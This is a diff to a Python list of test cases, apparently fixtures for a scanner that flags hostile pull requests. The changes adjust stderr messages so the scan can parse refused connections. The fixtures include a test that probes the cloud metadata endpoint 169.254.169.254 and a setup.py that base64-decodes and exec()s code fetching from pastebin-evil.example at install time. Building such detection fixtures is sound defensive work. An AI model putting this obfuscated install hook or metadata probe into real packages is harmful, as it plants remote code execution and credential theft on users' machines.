@@ -188,12 +188,12 @@ CASES: list[dict] = [
         body="Adds cloud-environment detection. (Queries the cloud metadata endpoint — from a test that runs with networking off.)",
         base={
             "README.md": "# metadata-probe\n",
-            "pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "metadata-probe"\nversion = "0.1.0"\n',
+            "pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "metadata-probe"\nversion = "0.1.0"\n\n[tool.pytest.ini_options]\naddopts = "-s"\n',
             "src/cloudprobe/__init__.py": "def on_cloud() -> bool:\n    return False\n",
             "tests/test_cloud.py": "from cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n",
         },
         pr={
-            "tests/test_cloud.py": "import urllib.request\n\nfrom cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n\ndef test_metadata_endpoint():\n    # loud on purpose: a silent probe leaves nothing in the sandbox record —\n    # the refused connection and its target must be on stderr to become evidence\n    try:\n        urllib.request.urlopen('http://169.254.169.254/latest/meta-data/', timeout=3)\n    except Exception as e:\n        raise AssertionError(f'cloud metadata probe to 169.254.169.254 refused: {e}')\n",
+            "tests/test_cloud.py": "import sys\nimport urllib.request\n\nfrom cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n\ndef test_metadata_endpoint():\n    # loud on purpose: the refused connection and its target must be on stderr to\n    # become evidence (the behaviour scan parses 'could not connect to <host>')\n    try:\n        urllib.request.urlopen('http://169.254.169.254/latest/meta-data/', timeout=3)\n    except Exception as e:\n        print(f'could not connect to 169.254.169.254: {e}', file=sys.stderr)\n        raise AssertionError(f'cloud metadata probe refused: {e}')\n",
         },
         fillers=8,
     ),
@@ -289,7 +289,7 @@ CASES: list[dict] = [
             "tests/test_util.py": "from obfutils import util\n\ndef test_util():\n    assert util() == 1\n",
         },
         pr={
-            "x:setup.py": "import base64\nimport subprocess\n\n# 'update check' — obfuscated so nobody reads it\ncode = base64.b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9wYXN0ZWJpbi1ldmlsLmV4YW1wbGUvcmF3JykK')\ntry:\n    exec(code)\nexcept Exception as _e:\n    import sys\n    print(f'update-check to pastebin-evil.example failed: {_e}', file=sys.stderr)\n    raise\n\nfrom setuptools import setup\nsetup(name='obfuscated-exec', version='0.2.0', packages=['obfutils'])\n",
+            "x:setup.py": "import base64\nimport subprocess\n\n# 'update check' — obfuscated so nobody reads it\ncode = base64.b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9wYXN0ZWJpbi1ldmlsLmV4YW1wbGUvcmF3JykK')\ntry:\n    exec(code)\nexcept Exception as _e:\n    import sys\n    print(f'could not connect to pastebin-evil.example: {_e}', file=sys.stderr)\n    raise\n\nfrom setuptools import setup\nsetup(name='obfuscated-exec', version='0.2.0', packages=['obfutils'])\n",
             "src/obfutils/__init__.py": "def util():\n    return 1\n",
         },
         fillers=14,
